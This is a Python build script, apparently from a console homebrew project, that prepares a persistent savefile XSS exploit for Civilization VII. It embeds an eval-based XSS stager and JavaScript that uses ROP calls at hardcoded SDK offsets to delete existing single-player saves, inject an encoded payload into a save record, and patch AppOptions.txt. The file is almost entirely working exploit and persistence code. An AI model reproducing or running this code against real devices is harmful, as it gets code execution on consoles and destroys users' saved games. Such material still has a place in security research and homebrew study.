#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Gezine. See LICENSES/Gezine-MIT.txt.
# Source: https://github.com/Gezine/CivSwitch/blob/3238a3e3340fd19a9dbd5cde56f3b50f9bc5d97f/installer-creator/install.py
"""install.py - prepare assets for the one-shot CIV7 savefile-XSS installer.

Builds the apply script and Base64 save template for transfer over UDP/LDN.
The console applies them and writes the persistent XSTRIG.Civ7Save trigger.

The LDN launcher can build offline transfer assets with:
  python install.py --build-ldn-assets <output-dir> [payload.js]

Needs: node + terser (npm install at the repository root),
and the bundled save template from this directory.
"""
import base64, io, json, os, shutil, subprocess, sys, tempfile

HERE = os.path.dirname(os.path.abspath(__file__))

STAGER = ('<img src=x onerror="eval(document.body.textContent'
          ".match(/XSSP:[0-9]+:[0-9a-f]+/g)"
          ".map(x=>x.split(':')[2])"
          ".join('')"
          '.replace(/../g,x=>String.fromCharCode(parseInt(x,16))))">')
assert '{' not in STAGER and '}' not in STAGER

BLOCK = r"""
(async function() {
try {

// ==== savefile-XSS installer (template transferred over LDN) ====
const F_CreateFile  = sdk_base + 0xa6700n;
const F_OpenFile    = sdk_base + 0xa78a0n;
const F_CloseFile   = sdk_base + 0xa5a70n;
const F_WriteFile   = sdk_base + 0xa5e00n;
const F_SetFileSize = sdk_base + 0xa6020n;
const F_GetFileSize = sdk_base + 0xa6120n;
const F_ReadFileSizeOut = sdk_base + 0xa5d70n;
const F_Commit      = sdk_base + 0xa7de0n;
const F_DeleteFile  = sdk_base + 0xa6710n;
const F_CreateDir   = sdk_base + 0xa6890n;
const F_OpenDir     = sdk_base + 0xa7bb0n;
const F_ReadDir     = sdk_base + 0xa5840n;
const F_CloseDir    = sdk_base + 0xa57b0n;

const STAGER = __STAGER__;
const STAGE_HEX = __STAGE_HEX__;
const TPL_B64_LEN = __TPL_B64_LEN__;

const sfx_h = malloc(8), sfx_sz = malloc(8);
const sfx_wo = malloc(8); write32(sfx_wo, 1n);
const sfx_dh = malloc(8), sfx_dn = malloc(8);
const sfx_pb = malloc(4096);
const sfx_dirbuf = malloc(0x310 * 32);

function sfx_writePath(bytes) {
    for (let i = 0; i < bytes.length; i++) write8(sfx_pb + BigInt(i), BigInt(bytes[i]));
    write8(sfx_pb + BigInt(bytes.length), 0n);
}
function sfx_listDir(path) {
    sfx_writePath(text_encode(path));
    if (call_rop(F_OpenDir, sfx_dh, sfx_pb, 3n) !== 0n) return null;
    const out = [];
    for (;;) {
        call_rop(F_ReadDir, sfx_dn, sfx_dirbuf, read64(sfx_dh), 32n);
        const n = Number(read64(sfx_dn));
        if (n <= 0) break;
        for (let i = 0; i < n; i++) {
            const e = sfx_dirbuf + BigInt(i * 0x310);
            let nm = "";
            for (let k = 0; k < 0x300; k++) {
                const c = Number(read8(e + BigInt(k)));
                if (!c) break;
                nm += String.fromCharCode(c);
            }
            out.push({ name: nm, type: Number(read32(e + 0x304n) & 0xffn) });
        }
        if (n < 32 || out.length >= 512) break;
    }
    call_rop(F_CloseDir, read64(sfx_dh));
    return out;
}
// Apply this once during persistence installation, not on each core startup.
const SFX_MAX_APP_OPTIONS_SIZE = 0x10000n;
const SFX_READ_CHUNK_SIZE = 0x300;
const SFX_APP_OPTIONS_PATH = "save:/saves/AppOptions.txt";

function sfx_alloc(allocations, size) {
    const addr = malloc(size);
    if (addr === 0n) throw new Error("AppOptions buffer allocation failed");
    allocations.push(addr);
    return addr;
}

function sfx_closeAppOptionsHandle(handle) {
    if (handle === 0n) return true;
    try {
        call_rop(F_CloseFile, handle);
        return true;
    } catch (error) {
        return false;
    }
}

function sfx_freeAppOptionsAllocations(allocations) {
    let success = true;
    for (let i = allocations.length - 1; i >= 0; i--) {
        try {
            free(allocations[i]);
        } catch (error) {
            success = false;
        }
    }
    return success;
}

function sfx_findIntroOptionPatch() {
    const allocations = [];
    let fileHandle = 0n;
    let foundPatch = null;
    let cleanupSucceeded = true;
    try {
        const pathBuffer = sfx_alloc(allocations, 0x100);
        const handleOut = sfx_alloc(allocations, 8);
        const sizeOut = sfx_alloc(allocations, 8);
        const readCountOut = sfx_alloc(allocations, 8);
        const readBuffer = sfx_alloc(allocations, SFX_READ_CHUNK_SIZE + 16);

        write_string(pathBuffer, SFX_APP_OPTIONS_PATH);
        write64(handleOut, 0n);
        if (call_rop(F_OpenFile, handleOut, pathBuffer, 1n) !== 0n) return null;
        fileHandle = read64(handleOut);
        if (fileHandle === 0n) return null;

        write64(sizeOut, 0n);
        if (call_rop(F_GetFileSize, sizeOut, fileHandle) !== 0n) return null;

        const fileSize = read64(sizeOut);
        if (fileSize === 0n || fileSize > SFX_MAX_APP_OPTIONS_SIZE) return null;

        let readOffset = 0n;
        let pendingText = "";
        let pendingOffset = 0;
        let section = "";

        function inspectLine(line, lineOffset) {
            const sectionMatch = line.trim().match(/^\[([^\]]+)\]$/);
            if (sectionMatch) {
                section = sectionMatch[1].toLowerCase();
                return null;
            }
            if (section !== "shell") return null;

            const optionMatch = /^([ \t]*)(;[ \t]*)?(ShowIntroSequences)([ \t]+)([^\s;]+)([ \t]*(?:;.*)?)$/i.exec(line);
            if (!optionMatch) return null;

            const activePrefix = optionMatch[2]
                ? optionMatch[2].slice(1)
                : "";
            const extraPadding = optionMatch[2] ? 1 : 0;
            const value = "0" + " ".repeat(optionMatch[5].length - 1 + extraPadding);
            const updatedLine = optionMatch[1] + activePrefix + optionMatch[3] +
                optionMatch[4] + value + optionMatch[6];
            if (updatedLine.length !== line.length) return null;

            const originalLineBytes = sfx_toBytes(line);
            const updatedLineBytes = sfx_toBytes(updatedLine);
            if (originalLineBytes === null || updatedLineBytes === null) return null;
            return { offset: BigInt(lineOffset), originalLineBytes, updatedLineBytes };
        }

        while (readOffset < fileSize) {
            const remaining = Number(fileSize - readOffset);
            const requested = Math.min(SFX_READ_CHUNK_SIZE, remaining);
            write64(readCountOut, 0n);
            const result = call_rop(F_ReadFileSizeOut, readCountOut, fileHandle,
                readOffset, readBuffer, BigInt(requested));
            if (result !== 0n) return null;

            const count = Number(read64(readCountOut));
            if (!Number.isInteger(count) || count <= 0 || count > requested) return null;

            const chunk = read_buffer(readBuffer, count);
            const chunkText = String.fromCharCode.apply(null, chunk);
            const combinedText = pendingText + chunkText;
            let cursor = 0;

            while (cursor < combinedText.length) {
                const lf = combinedText.indexOf("\n", cursor);
                const cr = combinedText.indexOf("\r", cursor);
                let lineEnd = -1;
                if (lf >= 0 && cr >= 0) lineEnd = Math.min(lf, cr);
                else lineEnd = Math.max(lf, cr);
                if (lineEnd < 0) break;

                const line = combinedText.slice(cursor, lineEnd);
                let delimiterSize = 1;
                if (combinedText[lineEnd] === "\r" && combinedText[lineEnd + 1] === "\n")
                    delimiterSize = 2;

                const patch = inspectLine(line, pendingOffset + cursor);
                if (patch !== null) {
                    foundPatch = patch;
                    break;
                }
                cursor = lineEnd + delimiterSize;
            }

            if (foundPatch !== null) break;
            pendingText = combinedText.slice(cursor);
            pendingOffset += cursor;
            readOffset += BigInt(count);
        }

        if (foundPatch === null && pendingText.length > 0)
            foundPatch = inspectLine(pendingText, pendingOffset);
        if (foundPatch !== null) {
            if (sfx_closeAppOptionsHandle(fileHandle)) fileHandle = 0n;
            else foundPatch = null;
        }
    } catch (error) {
        foundPatch = null;
    } finally {
        if (fileHandle !== 0n) {
            const handleToClose = fileHandle;
            fileHandle = 0n;
            if (!sfx_closeAppOptionsHandle(handleToClose)) cleanupSucceeded = false;
        }
        if (!sfx_freeAppOptionsAllocations(allocations)) cleanupSucceeded = false;
    }
    return cleanupSucceeded ? foundPatch : null;
}

function sfx_toBytes(text) {
    const bytes = new Uint8Array(text.length);
    for (let i = 0; i < text.length; i++) {
        const value = text.charCodeAt(i);
        if (value > 0xff) return null;
        bytes[i] = value;
    }
    return bytes;
}

function sfx_restoreIntroOption(handle, patch, buffer, writeOption) {
    try {
        const result = call_rop(F_WriteFile, handle, patch.offset, buffer,
            BigInt(patch.originalLineBytes.length), writeOption);
        if (result === 0n) return true;
        return false;
    } catch (error) {
        return false;
    }
}

function sfx_disableIntroCinematics() {
    const patch = sfx_findIntroOptionPatch();
    if (patch === null) return false;

    const allocations = [];
    let fileHandle = 0n;
    let originalBuffer = 0n;
    let writeOption = 0n;
    let writeAttempted = false;
    let writeSucceeded = false;
    try {
        const pathBuffer = sfx_alloc(allocations, 0x100);
        const handleOut = sfx_alloc(allocations, 8);
        const outputBuffer = sfx_alloc(allocations, patch.updatedLineBytes.length);
        originalBuffer = sfx_alloc(allocations, patch.originalLineBytes.length);
        writeOption = sfx_alloc(allocations, 8);

        write_string(pathBuffer, SFX_APP_OPTIONS_PATH);
        write_buffer(outputBuffer, patch.updatedLineBytes);
        write_buffer(originalBuffer, patch.originalLineBytes);
        write32(writeOption, 1n);

        write64(handleOut, 0n);
        if (call_rop(F_OpenFile, handleOut, pathBuffer, 3n) === 0n) {
            fileHandle = read64(handleOut);
            if (fileHandle !== 0n) {
                writeAttempted = true;
                const writeResult = call_rop(F_WriteFile, fileHandle, patch.offset,
                    outputBuffer, BigInt(patch.updatedLineBytes.length), writeOption);
                if (writeResult === 0n) {
                    writeSucceeded = sfx_closeAppOptionsHandle(fileHandle);
                    if (writeSucceeded) fileHandle = 0n;
                } else {
                    sfx_restoreIntroOption(fileHandle, patch, originalBuffer, writeOption);
                }
            }
        }
    } catch (error) {
        if (writeAttempted && fileHandle !== 0n && originalBuffer !== 0n && writeOption !== 0n)
            sfx_restoreIntroOption(fileHandle, patch, originalBuffer, writeOption);
    } finally {
        if (fileHandle !== 0n) {
            const handleToClose = fileHandle;
            fileHandle = 0n;
            if (!sfx_closeAppOptionsHandle(handleToClose)) writeSucceeded = false;
        }
        if (!sfx_freeAppOptionsAllocations(allocations)) writeSucceeded = false;
    }
    return writeSucceeded;
}

function sfx_b64dec(s) {
    const A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    const m = {};
    for (let i = 0; i < 64; i++) m[A[i]] = i;
    const out = [];
    let i = 0;
    while (i + 3 < s.length) {
        const c0 = m[s[i]], c1 = m[s[i+1]];
        const p2 = s[i+2] === "=", p3 = s[i+3] === "=";
        const c2 = p2 ? 0 : m[s[i+2]];
        const c3 = p3 ? 0 : m[s[i+3]];
        const v = (c0 << 18) | (c1 << 12) | (c2 << 6) | c3;
        out.push((v >> 16) & 255);
        if (!p2) out.push((v >> 8) & 255);
        if (!p2 && !p3) out.push(v & 255);
        i += 4;
    }
    return out;
}

const tplB64 = (window.__tpl || []).join("");
if (tplB64.length !== TPL_B64_LEN) {
    await log("E: template upload incomplete - rerun npm start");
    return;
}
window.__tpl = null;

const tpl = sfx_b64dec(tplB64);
if (tpl[0] !== 0x43 || tpl[1] !== 0x49 || tpl[2] !== 0x56 || tpl[3] !== 0x37) {
    await log("E: template bad magic");
    return;
}

const sub = sfx_listDir("save:/saves/Single/");
if (sub) {
    for (let j = 0; j < sub.length; j++) {
        if (sub[j].type !== 1) continue;
        const nm = sub[j].name;
        sfx_writePath(text_encode("save:/saves/Single/" + nm));
        call_rop(F_DeleteFile, sfx_pb);
    }
}

// find the currentTurnDate record by its field hash (FE5A61E8):
// [u32 hash][u64 tag][u32 framing 0x60000000|len+1][u32 flag][value][NUL]
let HPOS = -1;
for (let i = 0; i + 28 < tpl.length; i++) {
    if (tpl[i] !== 0xfe || tpl[i+1] !== 0x5a || tpl[i+2] !== 0x61 || tpl[i+3] !== 0xe8) continue;
    const f = (tpl[i+12] | (tpl[i+13] << 8) | (tpl[i+14] << 16) | (tpl[i+15] << 24)) >>> 0;
    const flag = (tpl[i+16] | (tpl[i+17] << 8) | (tpl[i+18] << 16) | (tpl[i+19] << 24)) >>> 0;
    if ((f & 0xe0000000) === 0x60000000 && flag === 1) { HPOS = i; break; }
}
if (HPOS < 0) { await log("E: currentTurnDate record not found"); return; }
const OLD_LEN = (((tpl[HPOS+12] | (tpl[HPOS+13] << 8) | (tpl[HPOS+14] << 16) | (tpl[HPOS+15] << 24)) >>> 0) & 0x1fffffff) - 1;
let oldVal = "";
for (let k = 0; k < OLD_LEN; k++) oldVal += String.fromCharCode(tpl[HPOS + 20 + k]);
if (oldVal !== "4000 BCE") { await log("E: unexpected record value"); return; }

const NEWVAL = STAGER + '<span style="display:none">XSSP:0:' + STAGE_HEX + '</span>';
const VAL_OFF = HPOS + 20;
const TAIL_OFF = VAL_OFF + OLD_LEN + 1;
const newSize = tpl.length + NEWVAL.length - OLD_LEN;
const out = malloc(newSize + 32);
let w = 0;
for (; w + 3 < VAL_OFF - 8; w += 4)
    write32(out + BigInt(w), BigInt(tpl[w] | (tpl[w+1] << 8) | (tpl[w+2] << 16) | (tpl[w+3] << 24)) & 0xffffffffn);
for (; w < VAL_OFF - 8; w++) write8(out + BigInt(w), BigInt(tpl[w]));
write32(out + BigInt(VAL_OFF - 8), BigInt(0x60000000 | (NEWVAL.length + 1)) & 0xffffffffn);
write32(out + BigInt(VAL_OFF - 4), 1n);
for (let k = 0; k < NEWVAL.length; k++) write8(out + BigInt(VAL_OFF + k), BigInt(NEWVAL.charCodeAt(k) & 0xff));
write8(out + BigInt(VAL_OFF + NEWVAL.length), 0n);
for (let k = TAIL_OFF; k < tpl.length; k++) write8(out + BigInt(k + (newSize - tpl.length)), BigInt(tpl[k]));

// ensure Single/ exists (bare console), write, commit
sfx_writePath(text_encode("save:/saves/Single"));
call_rop(F_CreateDir, sfx_pb);

sfx_writePath(text_encode("save:/saves/Single/XSTRIG.Civ7Save"));
call_rop(F_CreateFile, sfx_pb, BigInt(newSize));
const r2 = call_rop(F_OpenFile, sfx_h, sfx_pb, 6n);
if (r2 !== 0n) { await log("E: open XSTRIG " + toHex(r2)); return; }
const r3 = call_rop(F_SetFileSize, read64(sfx_h), BigInt(newSize));
if (r3 !== 0n) {
    call_rop(F_CloseFile, read64(sfx_h));
    await log("E: resize XSTRIG " + toHex(r3));
    return;
}
const r4 = call_rop(F_WriteFile, read64(sfx_h), 0n, out, BigInt(newSize), sfx_wo);
call_rop(F_CloseFile, read64(sfx_h));
if (r4 !== 0n) { await log("E: write " + toHex(r4)); return; }

const appOptionsWriteSucceeded = sfx_disableIntroCinematics();
sfx_writePath(text_encode("save"));
const cr = call_rop(F_Commit, sfx_pb);
const introCinematicsDisabled = cr === 0n && appOptionsWriteSucceeded === true;
await log(introCinematicsDisabled
    ? "Introduction's cinematics disabled"
    : "Could not disable introduction's cinematics");
if (cr !== 0n) { await log("E: commit " + toHex(cr)); return; }
window.__civswitchPersistOK = true;
await log("INSTALL DONE - reboot, Load Game");

} catch (e) {
await log('EXCEPTION: ' + e.message);
await log(e.stack);
}
})();
"""


def load_template():
    tpl = open(os.path.join(HERE, "save_template.bin"), "rb").read()
    if len(tpl) < 4096 or tpl[:4] != b"CIV7":
        raise ValueError("bad save_template.bin")
    return base64.b64encode(tpl).decode()


def build_apply_js(payload_path, tpl_b64, tmp):
    core = io.open(payload_path, encoding="utf-8").read().replace("\r\n", "\n")
    wrapped = ("(async function() {\ntry{\n" + core +
               "\n} catch (e) {\nawait log('EXCEPTION: ' + e.message);\nawait log(e.stack);\n}\n})();")
    wrapped_path = os.path.join(tmp, "wrapped.js")
    io.open(wrapped_path, "w", encoding="utf-8", newline="\n").write(wrapped)
    hex_path = os.path.join(tmp, "stage.hex")
    r = subprocess.run(["node", os.path.join(HERE, "compress_stage.js"),
                        wrapped_path, hex_path],
                       capture_output=True, text=True)
    print(r.stdout.strip())
    if r.returncode != 0:
        raise RuntimeError(r.stderr.strip() or "Could not compress the persistent payload")
    stage_hex = io.open(hex_path, encoding="utf-8").read().strip()
    return (BLOCK
            .replace("__STAGER__", json.dumps(STAGER))
            .replace("__STAGE_HEX__", json.dumps(stage_hex))
            .replace("__TPL_B64_LEN__", str(len(tpl_b64))))


def build_ldn_assets(output_dir, payload_path):
    os.makedirs(output_dir, exist_ok=True)
    tmp = tempfile.mkdtemp(prefix="civ7inst_ldn_")
    try:
        tpl_b64 = load_template()
        apply_js = build_apply_js(payload_path, tpl_b64, tmp)
        tpl_path = os.path.join(output_dir, "template.b64")
        js_path = os.path.join(output_dir, "apply.b64")
        open(tpl_path, "wb").write(tpl_b64.encode("ascii"))
        open(js_path, "wb").write(base64.b64encode(apply_js.encode("ascii")))
        print("LDN installer assets ready: template %d bytes, apply %d bytes" %
              (len(tpl_b64), os.path.getsize(js_path)))
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def main():
    if len(sys.argv) == 1:
        print(__doc__)
        sys.exit(1)
    if sys.argv[1] != "--build-ldn-assets" or len(sys.argv) not in (3, 4):
        print("Usage: install.py --build-ldn-assets <output-dir> [payload.js]", file=sys.stderr)
        sys.exit(1)

    payload_path = sys.argv[3] if len(sys.argv) == 4 else os.path.join(HERE, "..", "payloads", "core.js")
    try:
        build_ldn_assets(sys.argv[2], payload_path)
    except Exception as e:
        print("Could not build LDN installer assets: " + str(e), file=sys.stderr)
        sys.exit(2)


if __name__ == "__main__":
    main()
